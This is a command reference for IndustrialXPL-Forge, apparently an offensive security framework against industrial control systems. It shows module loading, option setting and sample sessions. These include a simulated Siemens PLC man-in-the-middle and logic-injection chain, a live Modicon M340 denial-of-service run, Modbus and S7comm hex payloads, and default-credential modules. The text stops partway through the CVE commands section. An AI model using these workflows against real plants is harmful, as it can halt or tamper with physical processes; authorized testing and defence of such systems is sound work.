# Shell Reference

Complete reference for all 36 IXF interactive shell commands (35 original + `nse`).

**Shell prompts:**
- `ixf >` — global context, no module loaded
- `ixf (Module Name) >` — module loaded and active

**Output prefix conventions:**
- `[*]` — status / informational
- `[+]` — success / positive finding
- `[-]` — error / negative result / not found
- `[!]` — warning / destructive action
- `[i]` — informational note

Commands with hyphens (e.g. `mitre-scan`) work with or without hyphens internally. All commands are case-insensitive. Tab completion is available for module paths.

---

## Table of Contents

1. [Navigation](#navigation) — `help`, `exit`, `use`, `back`
2. [Module Options](#module-options) — `set`, `setg`, `unsetg`
3. [Module Inspection](#module-inspection) — `show` (info/options/advanced/devices/all)
4. [Execution](#execution) — `run`, `check`
5. [Discovery](#discovery) — `search`, `discover`
6. [CVE Commands](#cve-commands) — `cve`, `cve-scan`
7. [Reports](#reports) — `report` (json/html/markdown)
8. [MITRE ATT&CK for ICS](#mitre-attck-for-ics) — `mitre`, `mitre-list`, `mitre-scan`, `mitre-all`, `mitre-coverage`, `mitre-report`, `mitre-tactic`
9. [TTP Execution](#ttp-execution) — `ttp`, `ttp-check`, `ttp-simulate`, `ttp-list`
10. [Assessment](#assessment) — `assess`
11. [Statistics & Coverage](#statistics--coverage) — `stats`, `vendors`, `protocols`, `coverage`
12. [LLM / SAST](#llm--sast) — `llm-key`, `llm-status`, `sast`
13. [Utility](#utility) — `exec`
14. [NSE Scripts](#nse-scripts) — `nse` (install/list/status/--force)

---

## Navigation

### `help`

Display the global help menu or module-specific help when a module is loaded.

**Syntax:** `help`

**Context:** global or module

**Parameters:** none

**Example 1 — Global help menu:**

```
ixf > help

  IndustrialXPL-Forge v1.0.13 — IXF Shell Commands
  ─────────────────────────────────────────────────────────────────────
  GLOBAL COMMANDS
    help                           Show this help menu
    use <module>                   Load a module
    back                           Unload current module
    search <term>                  Search modules by keyword/CVE/vendor
    set <option> <value>           Set module option
    setg <option> <value>          Set global option (all modules)
    unsetg <option>                Clear a global option
    show [info|options|advanced|devices|all]  Show module details
    run                            Execute loaded module
    check                          Connectivity/vulnerability check (read-only)
    discover <CIDR>                OT device discovery sweep
    cve <CVE-ID>                   Load module by CVE ID
    cve-scan <CIDR>                Suggest CVE testing workflow for subnet
    report [json|html|markdown]    Generate assessment report
    exec <shell_cmd>               Execute a shell command
    mitre <TID>                    List modules for a MITRE technique
    mitre-list [tactic]            List all mapped techniques
    mitre-scan <tactic|TID> <ip>   MITRE tactic/technique sweep
    mitre-all <target>             Full MITRE ICS sweep (simulate)
    mitre-coverage                 Coverage % per tactic
    mitre-report [json|html|layer] Generate MITRE report/Navigator layer
    mitre-tactic <tactic> <ip>     Alias for mitre-scan
    ttp <TID> <target>             Execute all modules for a technique
    ttp-check <TID> <target>       Read-only check for a technique
    ttp-simulate <TID> <target>    Force simulate for a technique
    ttp-list [--tactic <name>]     List TTP-IDs with module counts
    assess <module_path>           Load and run an assessment module
    stats                          Module statistics and coverage summary
    vendors [filter]               List covered vendors
    protocols                      List covered protocols
    coverage                       Alias for mitre-coverage
    llm-key <provider> <api_key>   Configure LLM provider for SAST
    llm-status                     Show LLM provider status
    sast <path> [--mode <mode>]    Offline LLM-powered PLC code analysis
    nse [install|list|status]      Manage Nmap NSE scripts
    exit                           Exit IXF
```

**Example 2 — Module-specific help (when module is loaded):**

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > help

  MODULE COMMANDS (CVE-2021-22681 Siemens S7-1200/1500 PLC)
  ─────────────────────────────────────────────────────────────────────
    run                            Execute the current module
    check                          Read-only fingerprint / vuln check
    back                           Deselect the current module
    set <option> <value>           Set a module option
    setg <option> <value>          Set a global option
    unsetg <option>                Clear a global option
    show [info|options|advanced|devices|all]  Print module details

  Current options:
    target    (not set)   [REQUIRED]
    port      102
    simulate  True
    destructive False

  [i] Type 'show options' for full option table
  [i] Type 'show info' for module metadata
```

**Example 3 — Help when no module is loaded (global):**

```
ixf > help

  [i] 976 modules loaded | 150 vendors | 12 MITRE tactics | 82% coverage
  ...
```

**Error scenario:**

```
ixf > helpme
[-] Unknown command: 'helpme'. Type 'help' for available commands.
```

**Related commands:** `exit`, `show`

---

### `exit`

Exit the IXF shell cleanly. Saves readline history to `~/.ixf_history`.

**Syntax:** `exit`

**Context:** global or module

**Parameters:** none

**Example 1 — Exit from global context:**

```
ixf > exit
[*] Exiting IndustrialXPL-Forge. Stay safe.
```

**Example 2 — Exit from module context:**

```
ixf (Modbus TCP Device Detect) > exit
[*] Exiting IndustrialXPL-Forge. Stay safe.
```

**Example 3 — Exit with Ctrl+D (EOF):**

```
ixf > ^D
[*] Exiting IndustrialXPL-Forge. Stay safe.
```

**Error scenario:**

```
ixf > exit now
[*] Exiting IndustrialXPL-Forge. Stay safe.
```

> Extra arguments after `exit` are silently ignored — exit always succeeds.

**Related commands:** `help`, `back`

---

### `use <module_path>`

Load a module by its path. Accepts slash notation (`scanners/ics/modbus_detect`) or dot notation (`scanners.ics.modbus_detect`). Tab completion is available.

**Syntax:** `use <module_path>`

**Context:** global or module (replaces currently loaded module)

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| module_path | string | yes | — | Any path under `modules/` (slash or dot) | Must resolve to an importable Python module with `__info__` and `run()` |

**Example 1 — Load a scanner module:**

```
ixf > use scanners/ics/modbus_detect
[*] Module loaded: Modbus TCP Device Detect
[*] CVE: N/A | CVSS: N/A | Impact: LOW

ixf (Modbus TCP Device Detect) >
```

**Example 2 — Load a CVE exploit module:**

```
ixf > use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
[*] Module loaded: CVE-2021-22681 Siemens S7-1200/1500 PLC
[*] CVE: CVE-2021-22681 | CVSS: 9.8 | Impact: CRITICAL

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) >
```

**Example 3 — Load using dot notation (equivalent):**

```
ixf > use cve.siemens.cve_2021_22681_s7_1200_hardcoded_key
[*] Module loaded: CVE-2021-22681 Siemens S7-1200/1500 PLC
[*] CVE: CVE-2021-22681 | CVSS: 9.8 | Impact: CRITICAL
```

**Example 4 — Module requires optional runtime:**

```
ixf > use cve/malware/frostygoop_modbus_heating
[!] Module requires 'go' runtime. Python fallback available.
    Install Go: https://go.dev/dl/
[*] Module loaded: FrostyGoop Modbus Heating Attack (Go) — Extended
[*] CVE: N/A | CVSS: N/A | Impact: CATASTROPHIC
```

**Example 5 — Switch modules while one is already loaded:**

```
ixf (Modbus TCP Device Detect) > use cve/honeywell/cve_2023_5389_experion_rce
[*] Module loaded: CVE-2023-5389 Honeywell Experion PKS RCE
[*] CVE: CVE-2023-5389 | CVSS: 10.0 | Impact: CRITICAL

ixf (CVE-2023-5389 Honeywell Experion PKS RCE) >
```

**Error scenario — Module not found:**

```
ixf > use scanners/ics/nonexistent_scanner
[-] Module not found: scanners/ics/nonexistent_scanner
[i] Try: search nonexistent_scanner
```

**Error scenario — Module path required:**

```
ixf > use
[-] Usage: use <module_path>
    Example: use scanners/ics/modbus_detect
    Example: use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
```

**Related commands:** `back`, `search`, `cve`, `show`

---

### `back`

Unload the current module and return to the global context. No effect if no module is loaded.

**Syntax:** `back`

**Context:** module only (safe to run from global — silently ignored)

**Parameters:** none

**Example 1 — Standard back from module:**

```
ixf (Modbus TCP Device Detect) > back
ixf >
```

**Example 2 — Back after setting options (options are discarded):**

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set target 192.168.1.50
[*] target => 192.168.1.50
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > back
ixf >
[i] Module options cleared. Global options (setg) are still active.
```

**Example 3 — Back from global (no-op):**

```
ixf > back
ixf >
```

**Error scenario:** `back` never produces an error. It is always safe.

**Related commands:** `use`, `exit`

---

## Module Options

### `set <option> <value>`

Set an option on the currently loaded module. Changes apply immediately to the loaded module instance. Options are validated according to their type definition.

**Syntax:** `set <option> <value>`

**Context:** module only (requires a module to be loaded)

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| option | string | yes | — | Any option name declared in the module | Case-insensitive match |
| value | varies | yes | — | Depends on option type: string, int, bool, IP | Type-checked; range-checked where applicable |

**Boolean values accepted:** `true`, `false`, `yes`, `no`, `on`, `off`, `1`, `0`

**Example 1 — Set target IP and port:**

```
ixf (Modbus TCP Device Detect) > set target 192.168.1.100
[*] target => 192.168.1.100

ixf (Modbus TCP Device Detect) > set port 5020
[*] port => 5020
```

**Example 2 — Set boolean options:**

```
ixf (Modbus TCP Device Detect) > set simulate false
[*] simulate => False

ixf (Modbus TCP Device Detect) > set destructive true
[*] destructive => True

ixf (Modbus TCP Device Detect) > set verbose yes
[*] verbose => True
```

**Example 3 — Set timeout and verify with show options:**

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set timeout 15
[*] timeout => 15

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set target 10.0.0.50
[*] target => 10.0.0.50

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > show options
     Options — CVE-2021-22681 Siemens S7-1200/1500 PLC
+-------------+-----------+----------+----------------------------------------------+
| Option      | Value     | Required | Description                                  |
|-------------+-----------+----------+----------------------------------------------|
| target      | 10.0.0.50 | yes      | Target Siemens S7-1200 IP                    |
| port        | 102       | no       | S7comm port (default 102)                    |
| simulate    | True      | no       | Simulate — no packets sent (default: True)   |
| destructive | False     | no       | Live exploitation — may cause irreversible   |
| timeout     | 15        | no       | Connection timeout in seconds                |
+-------------+-----------+----------+----------------------------------------------+
```

**Error scenario — Invalid port value:**

```
ixf (Modbus TCP Device Detect) > set port 99999
[-] Validation error for 'port': Port must be between 1 and 65535

ixf (Modbus TCP Device Detect) > set port abc
[-] Validation error for 'port': Expected integer, got 'abc'
```

**Error scenario — Unknown option:**

```
ixf (Modbus TCP Device Detect) > set badoption value
[-] Unknown option: 'badoption'
[i] Available options: target, port, simulate, destructive, timeout, verbose
```

**Error scenario — No module loaded:**

```
ixf > set target 192.168.1.1
[-] No module loaded. Use 'use <module>' first.
```

**Related commands:** `setg`, `unsetg`, `show`, `run`

---

### `setg <option> <value>`

Set a global option that persists across all modules in the current session. When a module is loaded, it inherits global options for matching option names unless overridden locally with `set`.

**Syntax:** `setg <option> <value>`

**Context:** global or module

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| option | string | yes | — | Any option name | Case-insensitive |
| value | varies | yes | — | String, int, or bool depending on option | Same as `set` |

**Common global options:** `target`, `timeout`, `simulate`, `destructive`, `verbose`

**Example 1 — Set global target then load multiple modules:**

```
ixf > setg target 10.0.0.100
[*] Global: target => 10.0.0.100

ixf > use scanners/ics/modbus_detect
[*] Module loaded: Modbus TCP Device Detect
[*] target already set from global: 10.0.0.100

ixf (Modbus TCP Device Detect) > run
  [SIMULATE MODE — no packets sent]
  [i] Would scan 10.0.0.100:502 for Modbus TCP device...
```

**Example 2 — Set global simulate=false for an authorized session:**

```
ixf > setg simulate false
[*] Global: simulate => False
[!] All modules will operate in LIVE mode. Authorized environments only.

ixf > setg timeout 30
[*] Global: timeout => 30
```

**Example 3 — Chain multiple setg with module use:**

```
ixf > setg target 192.168.10.0/24
[*] Global: target => 192.168.10.0/24

ixf > setg verbose true
[*] Global: verbose => True

ixf > use cve/schneider_electric/cve_2022_24323_modicon_m340_dos
[*] Module loaded: CVE-2022-24323 Modicon M340 DoS
[*] target already set from global: 192.168.10.0/24

ixf (CVE-2022-24323 Modicon M340 DoS) > show options
     Options — CVE-2022-24323 Modicon M340 DoS
+-------------+-----------------+----------+---------------------------------------+
| Option      | Value           | Required | Description                           |
|-------------+-----------------+----------+---------------------------------------|
| target      | 192.168.10.0/24 | yes      | Target IP or CIDR (global)            |
| port        | 502             | no       | Modbus TCP port                       |
| simulate    | False           | no       | Inherited from global setg            |
| destructive | False           | no       | Enable real execution                 |
| timeout     | 10              | no       | Connection timeout                    |
+-------------+-----------------+----------+---------------------------------------+
```

**Error scenario — Missing value:**

```
ixf > setg target
[-] Usage: setg <option> <value>
    Example: setg target 192.168.1.100
```

**Related commands:** `set`, `unsetg`, `show`

---

### `unsetg <option>`

Remove a previously set global option. After unset, modules will use their own default value for that option.

**Syntax:** `unsetg <option>`

**Context:** global or module

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| option | string | yes | — | Any previously set global option | Silently no-ops if not set |

**Example 1 — Unset target:**

```
ixf > setg target 10.0.0.1
[*] Global: target => 10.0.0.1

ixf > unsetg target
[*] Global 'target' cleared.
```

**Example 2 — Unset simulate to restore per-module defaults:**

```
ixf > setg simulate false
[*] Global: simulate => False

ixf > unsetg simulate
[*] Global 'simulate' cleared.
[i] Modules will now use their own default (simulate=True).
```

**Example 3 — Unset non-existent global (no-op):**

```
ixf > unsetg nonexistent
[*] Global 'nonexistent' not set (no-op).
```

**Error scenario — No argument:**

```
ixf > unsetg
[-] Usage: unsetg <option>
```

**Related commands:** `setg`, `set`

---

## Module Inspection

### `show [subcommand]`

Display module information. Without subcommand defaults to `options`.

**Syntax:** `show [info|options|advanced|devices|all]`

**Context:** module only

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| subcommand | string | no | `options` | `info`, `options`, `advanced`, `devices`, `all` | Case-insensitive |

| Subcommand | Description |
|------------|-------------|
| `options` | Standard options table (target, port, simulate, destructive, timeout) |
| `info` | Full module metadata from `__info__` dictionary |
| `advanced` | Advanced options only (rate_limit, retry, verbose, etc.) |
| `devices` | Target device types and firmware versions |
| `all` | Both `info` and `options` combined |

**Example 1 — `show options` (default):**

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > show options

     Options — CVE-2021-22681 Siemens S7-1200/1500 PLC
+-------------+-----------+----------+----------------------------------------------+
| Option      | Value     | Required | Description                                  |
|-------------+-----------+----------+----------------------------------------------|
| target      |           | yes      | Target Siemens S7-1200/1500 IP address       |
| port        | 102       | no       | S7comm TCP port (default: 102)               |
| simulate    | True      | no       | Simulate only — no packets sent              |
| destructive | False     | no       | Enable live exploitation (irreversible risk) |
| timeout     | 10        | no       | Connection timeout in seconds (1-300)        |
+-------------+-----------+----------+----------------------------------------------+
[i] Required options not set: target
```

**Example 2 — `show info`:**

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > show info

  Module Information
  ─────────────────────────────────────────────────────────────────
  name            : CVE-2021-22681 Siemens S7-1200/1500 PLC
  description     : Siemens S7-1200/1500 hardcoded TLS private key allows
                    man-in-the-middle attacks and firmware decryption. CVSS 9.8.
  authors         : Andre Henrique (mrhenrike)
  references      : https://cert-portal.siemens.com/productcert/pdf/ssa-568428.pdf
                    https://nvd.nist.gov/vuln/detail/CVE-2021-22681
  devices         : Siemens S7-1200 (all firmware), Siemens S7-1500 (all firmware)
  impact          : CRITICAL
  exploit_type    : Hardcoded Key — MitM/Decryption/Firmware Exfiltration
  cve             : CVE-2021-22681
  cvss            : 9.8
  severity        : CRITICAL
  mitre_techniques: T0855 (Unauthorized Command Message), T0830 (Adversary-in-the-Middle)
  mitre_tactics   : Collection, Lateral Movement
```

**Example 3 — `show advanced`:**

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > show advanced

     Advanced Options — CVE-2021-22681 Siemens S7-1200/1500 PLC
+-------------------+-------+----------+-----------------------------------------+
| Option            | Value | Required | Description                             |
|-------------------+-------+----------+-----------------------------------------|
| verbose           | False | no       | Enable verbose output                   |
| retry             | 3     | no       | Connection retry count (1-10)           |
| rate_limit        | 0     | no       | Milliseconds between requests (0=none)  |
| output_file       |       | no       | Save results to file path               |
+-------------------+-------+----------+-----------------------------------------+
```

**Example 4 — `show devices`:**

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > show devices

  Target Devices
  ─────────────────────────────────────────────────────────────────
  Device                    Firmware            Notes
  Siemens S7-1200 PLC       All versions        CPU 1211C, 1212C, 1214C, 1215C, 1217C
  Siemens S7-1500 PLC       All versions        CPU 1511-1 PN, 1513-1 PN, 1515-2 PN...
  Siemens ET 200SP CPU       All versions        ET 200SP open controller
```

**Example 5 — `show all`:**

```
ixf (Modbus TCP Device Detect) > show all

  Module Information
  ─────────────────────────────────────────────────────────────────
  name            : Modbus TCP Device Detect
  description     : Detect and fingerprint Modbus TCP devices on a target
  authors         : Andre Henrique (mrhenrike)
  references      : https://modbus.org/specs.php
  devices         : Generic Modbus TCP devices (PLCs, RTUs, gateways)
  impact          : LOW
  exploit_type    : Scanner
  cve             : N/A
  cvss            : N/A

     Options — Modbus TCP Device Detect
+-------------+-------+----------+---------------------------------------------------+
| Option      | Value | Required | Description                                       |
|-------------+-------+----------+---------------------------------------------------|
| target      |       | yes      | Target IP or CIDR range                           |
| port        | 502   | no       | Modbus TCP port                                   |
| simulate    | True  | no       | Simulate — no packets sent                        |
| destructive | False | no       | Enable real execution                             |
| timeout     | 10    | no       | Connection timeout (seconds)                      |
| unit_id     | 1     | no       | Modbus unit identifier (1-255)                    |
+-------------+-------+----------+---------------------------------------------------+
```

**Error scenario — show without module:**

```
ixf > show options
[-] No module loaded. Use 'use <module>' first.
```

**Error scenario — Invalid subcommand:**

```
ixf (Modbus TCP Device Detect) > show bad
[-] Unknown subcommand: 'bad'. Valid: info, options, advanced, devices, all
```

**Related commands:** `set`, `run`, `use`

---

## Execution

### `run`

Execute the loaded module. Behavior is controlled by the `simulate` and `destructive` options. Validates that all required options are set before executing.

**Syntax:** `run`

**Context:** module only

**Parameters:** none (options set via `set`/`setg`)

| simulate | destructive | Behavior |
|----------|-------------|----------|
| `True` (default) | any | Print simulation output only; no packets sent |
| `False` | `False` | Run `check()` probe only — read-only |
| `False` | `True` | Full exploit with DestructiveGate confirmation for HIGH/CRITICAL/CATASTROPHIC |

**Example 1 — Default simulate mode (scanner):**

```
ixf (Modbus TCP Device Detect) > set target 192.168.1.100
[*] target => 192.168.1.100

ixf (Modbus TCP Device Detect) > run

  [SIMULATE MODE — no packets sent]
  ─────────────────────────────────────────────────────────────────
  [i] What would happen:
      Modbus TCP Device Detect on 192.168.1.100:502

      Phase 1 [TCP Connect]: Would attempt TCP connection to 192.168.1.100:502
      Phase 2 [FC04 Probe]:  Would send Modbus Function Code 04 (Read Input Registers)
                             Unit ID: 1 | Registers: 0-9
      Phase 3 [Fingerprint]: Would analyze response for device type and firmware
      Phase 4 [Banner]:      Would attempt to read device identification (FC43)

  [i] Payload (hex): 00 01 00 00 00 06 01 04 00 00 00 0A
  [i] MITRE ATT&CK for ICS: T0846 (Remote System Discovery)
  [i] To run live: set simulate false (no destructive action for LOW impact)
```

**Example 2 — Simulate mode with CRITICAL CVE:**

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set target 10.0.0.50
[*] target => 10.0.0.50

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > run

  [SIMULATE MODE — no packets sent]
  ─────────────────────────────────────────────────────────────────
  [i] What would happen:
      CVE-2021-22681 — Siemens S7-1200/1500 Hardcoded TLS Key Exploit

      Phase 1 [S7comm+ Connect]: TCP to 10.0.0.50:102, negotiate S7comm+ TLS
      Phase 2 [Key Extraction]:  Use hardcoded private key (known, extracted from firmware)
      Phase 3 [MitM Position]:   Intercept STEP 7/TIA Portal ↔ PLC communications
      Phase 4 [Decrypt Payload]: Decrypt engineering traffic, extract ladder logic
      Phase 5 [Modify Logic]:    Optionally inject modified PLC program via authenticated session
      Phase 6 [Persistence]:     Download modified program — persists across PLC restart

  [i] Payload (hex): 03 00 00 1F 02 F0 80 32 01 00 00 00 01 00 0E 00 00 04 01 12 04 11 44 01 00 FF
  [i] MITRE ATT&CK for ICS: T0830 (Adversary-in-the-Middle), T0855 (Unauthorized Command Message)
  [i] To run live: set simulate false + set destructive true
  [!] This is a CRITICAL impact module — DestructiveGate confirmation required for live execution
```

**Example 3 — Live destructive run (HIGH impact with confirmation):**

```
ixf (CVE-2022-24323 Modicon M340 DoS) > set target 10.0.1.20
[*] target => 10.0.1.20

ixf (CVE-2022-24323 Modicon M340 DoS) > set simulate false
[*] simulate => False

ixf (CVE-2022-24323 Modicon M340 DoS) > set destructive true
[*] destructive => True

ixf (CVE-2022-24323 Modicon M340 DoS) > run

  ██████████████████████████████████████████████████████████
  ██  DESTRUCTIVE MODE — HIGH IMPACT                      ██
  ██  Device restart / process stop. Requires operator   ██
  ██  intervention to recover.                           ██
  ██████████████████████████████████████████████████████████

  Module:  CVE-2022-24323 Modicon M340 DoS
  Target:  10.0.1.20:502
  Impact:  HIGH — Modicon M340 forced stop via malformed Modbus request

  Type the following string EXACTLY to confirm (case-sensitive):
  I ACCEPT FULL RESPONSIBILITY FOR THIS DESTRUCTIVE OPERATION

  Confirmation> I ACCEPT FULL RESPONSIBILITY FOR THIS DESTRUCTIVE OPERATION
[*] Confirmed. Audit entry written. Executing...
[*] Connecting to 10.0.1.20:502...
[+] Connection established. Sending malformed Modbus PDU...
[+] Target unresponsive after 3 seconds — DoS likely successful
[*] Audit entry: .log/destructive_ops_2026-06-01.log
```

**Error scenario — Required option not set:**

```
ixf (Modbus TCP Device Detect) > run
[-] Required option 'target' not set. Use: set target <IP>
```

**Error scenario — No module loaded:**

```
ixf > run
[-] No module loaded. Use 'use <module>' first.
```

**Related commands:** `check`, `set`, `setg`, `show`

---

### `check`

Run a read-only connectivity and vulnerability probe. Calls the module's `check()` method. No exploit payloads are sent — only safe fingerprinting queries. Does not require `destructive=true`.

**Syntax:** `check`

**Context:** module only

**Parameters:** none

**Example 1 — Check confirms vulnerability:**

```
ixf (Modbus TCP Device Detect) > set target 192.168.1.100
[*] target => 192.168.1.100

ixf (Modbus TCP Device Detect) > check
[*] Checking 192.168.1.100:502...
[*] TCP connection: OK
[*] Sending Modbus FC04 probe...
[+] VULNERABLE — Modbus device detected
[+] Device: Schneider Electric Modicon M340 (inferred from register layout)
[+] Unit IDs responding: 1, 2
[i] To exploit: run (with simulate=false + destructive=true for destructive modules)
```

**Example 2 — Check fails (port closed):**

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set target 192.168.1.50
[*] target => 192.168.1.50

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > check
[*] Checking 192.168.1.50:102...
[-] NOT VULNERABLE — Port 102 not reachable or S7comm+ not detected
[-] Connection timeout after 10s
[i] Verify target is a Siemens S7-1200/1500 with S7comm+ enabled
```

**Example 3 — Check shows partial vulnerability:**

```
ixf (CVE-2023-6448 Unitronics UniStream PLC) > set target 10.0.0.25
[*] target => 10.0.0.25

ixf (CVE-2023-6448 Unitronics UniStream PLC) > check
[*] Checking 10.0.0.25:20256...
[*] PCOM port 20256: OPEN
[+] Unitronics PLC detected — PCOM protocol confirmed
[!] POTENTIAL — Web interface detected on :8080 (authentication check needed)
[i] Device may be vulnerable to CVE-2023-6448 (default credentials + path traversal)
[i] Run 'run' to simulate full exploit chain
```

**Error scenario — No module loaded:**

```
ixf > check
[-] No module loaded. Use 'use <module>' first.
```

**Error scenario — Module has no check() method:**

```
ixf (IEC 62443 Zone Conduit Audit) > check
[-] Module 'IEC 62443 Zone Conduit Audit' does not implement check(). Use 'run' instead.
```

**Related commands:** `run`, `ttp-check`

---

## Discovery

### `search <term>`

Search the module index for modules matching a keyword, CVE ID, vendor name, protocol, or category. Results are sorted by relevance.

**Syntax:** `search <term>`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| term | string | yes | — | Any substring | Case-insensitive substring match |

**Example 1 — Search by CVE:**

```
ixf > search CVE-2022-29965
[*] Search results for: CVE-2022-29965
┌──────────────────────────────────────────────────────────────────────────────┐
│ Module                                              Impact   CVE             │
├──────────────────────────────────────────────────────────────────────────────┤
│ use cve/emerson/cve_2022_29965_roc800_hardcoded     HIGH     CVE-2022-29965  │
└──────────────────────────────────────────────────────────────────────────────┘
[*] 1 result(s) found.
```

**Example 2 — Search by vendor:**

```
ixf > search siemens
[*] Search results for: siemens (showing 30 of 47)
┌──────────────────────────────────────────────────────────────────────────────┐
│ Module                                              Impact   CVE             │
├──────────────────────────────────────────────────────────────────────────────┤
│ use cve/siemens/cve_2021_22681_s7_1200_hardcoded   CRITICAL CVE-2021-22681   │
│ use cve/siemens/cve_2022_38465_s7_global_key       CRITICAL CVE-2022-38465   │
│ use cve/siemens/cve_2019_13945_s7_1500_cpu_dos     HIGH     CVE-2019-13945   │
│ use cve/siemens/cve_2019_10929_s7_cotp_dos         HIGH     CVE-2019-10929   │
│ use cve/siemens/cve_2023_44317_simatic_pcs_rce     CRITICAL CVE-2023-44317   │
│ use creds/siemens/ssh_default_creds                MEDIUM   N/A              │
│ use creds/siemens/telnet_default_creds             MEDIUM   N/A              │
│ use scanners/ics/s7_comm_scanner                   READ     N/A              │
│ ...                                                ...      ...              │
└──────────────────────────────────────────────────────────────────────────────┘
[*] 47 result(s) found (showing 30). Use a more specific term to narrow results.
```

**Example 3 — Search by protocol:**

```
ixf > search dnp3
[*] Search results for: dnp3
┌──────────────────────────────────────────────────────────────────────────────┐
│ Module                                              Impact   CVE             │
├──────────────────────────────────────────────────────────────────────────────┤
│ use exploits/protocols/dnp3/dnp3_data_spoofing     HIGH     N/A              │
│ use exploits/protocols/dnp3/dnp3_replay_command    HIGH     N/A              │
│ use exploits/protocols/dnp3/dnp3_unauthorized_ctrl HIGH     N/A              │
│ use scanners/ics/dnp3_scanner                      READ     N/A              │
│ use assessment/protocols/dnp3_security_audit       INFO     N/A              │
└──────────────────────────────────────────────────────────────────────────────┘
[*] 5 result(s) found.
```

**Example 4 — Search by category:**

```
ixf > search default_creds
[*] Search results for: default_creds (showing 34 of 34)
┌──────────────────────────────────────────────────────────────────────────────┐
│ Module                                              Impact   CVE             │
├──────────────────────────────────────────────────────────────────────────────┤
│ use creds/siemens/ssh_default_creds                MEDIUM   N/A              │
│ use creds/siemens/telnet_default_creds             MEDIUM   N/A              │
│ use creds/siemens/webinterface_http_auth_default   MEDIUM   N/A              │
│ use creds/rockwell/ssh_default_creds               MEDIUM   N/A              │
│ use creds/schneider/ssh_default_creds              MEDIUM   N/A              │
│ use creds/honeywell/experion_default_creds         MEDIUM   N/A              │
│ use creds/schneider_electric/modicon_default_creds MEDIUM   N/A              │
│ ...                                                ...      ...              │
└──────────────────────────────────────────────────────────────────────────────┘
[*] 34 result(s) found.
```

**Error scenario — No results:**

```
ixf > search xyznotavendor123
[*] Search results for: xyznotavendor123
[-] No results found.
[i] Try a different keyword: vendor name, CVE ID, protocol, or category
```

**Error scenario — Empty search term:**

```
ixf > search
[-] Usage: search <term>
    Example: search modbus
    Example: search CVE-2022-29965
    Example: search default_creds
```

**Related commands:** `use`, `cve`, `vendors`, `protocols`

---

### `discover <CIDR>`

Launch an OT device discovery sweep on a subnet. Guides the user toward the appropriate scanning workflow and loads the initial discovery module.

**Syntax:** `discover <CIDR>`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| CIDR | string | yes | — | IPv4 CIDR notation (e.g. `192.168.1.0/24`) or single IP | Basic CIDR format validation |

**Example 1 — Subnet discovery with guidance:**

```
ixf > discover 192.168.1.0/24
[*] Loading scanners/ics/modbus_detect for OT sweep on 192.168.1.0/24...
[*] Module loaded: Modbus TCP Device Detect
[*] target => 192.168.1.0/24

[i] OT Discovery Workflow — 192.168.1.0/24
    ─────────────────────────────────────────────────────────────────
    1. Protocol sweep (all 50 protocols):
       ixf > ttp T0846 192.168.1.0/24
    2. Multi-protocol active scan:
       ixf > use scanners/ics/modbus_detect
       ixf > use scanners/ics/s7_comm_scanner
       ixf > use scanners/ics/dnp3_scanner
    3. OPC UA discovery:
       ixf > use scanners/ics/opcua_scanner
    4. Nmap ICS sweep (external):
       nmap --script ics-sweep -p 102,502,47808,4840,20000 192.168.1.0/24

ixf (Modbus TCP Device Detect) > run
  [SIMULATE MODE — no packets sent]
  [i] Would scan 192.168.1.0-255:502 for Modbus TCP devices...
```

**Example 2 — Single host discovery:**

```
ixf > discover 10.0.0.1
[*] Loading scanners/ics/modbus_detect for single-host OT check on 10.0.0.1...
[*] Module loaded: Modbus TCP Device Detect
[*] target => 10.0.0.1
[i] For multi-protocol single host:
    ixf > ttp T0846 10.0.0.1
```

**Example 3 — Class B network (large subnet):**

```
ixf > discover 10.10.0.0/16
[*] Loading scanners/ics/modbus_detect for OT sweep on 10.10.0.0/16...
[!] Large subnet (65536 hosts) — consider scanning a /24 segment first
[i] For a faster sweep: use scanners/ics/modbus_detect + set target 10.10.0.0/24
```

**Error scenario — Invalid CIDR:**

```
ixf > discover 192.168.300.0/24
[-] Invalid CIDR: '192.168.300.0/24'. Example: 192.168.1.0/24

ixf > discover not_an_ip
[-] Invalid CIDR: 'not_an_ip'. Example: 192.168.1.0/24
```

**Related commands:** `search`, `ttp`, `mitre-scan`

---

## CVE Commands

### `cve <CVE-ID>`

Find and load a module by CVE identifier. Supports CVE, CNVD, and ICS-CERT advisory identifiers.

**Syntax:** `cve <CVE-ID>`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| CVE-ID | string | yes | — | CVE-YYYY-NNNNN, CNVD-YYYY-NNNNN, ICSA-YY-NNN-NN | Substring match on module paths |

**Example 1 — Unique CVE match (auto-loads):**

```
ixf > cve CVE-2021-22681
[*] Module loaded: CVE-2021-22681 Siemens S7-1200/1500 PLC
[*] CVE: CVE-2021-22681 | CVSS: 9.8 | Impact: CRITICAL
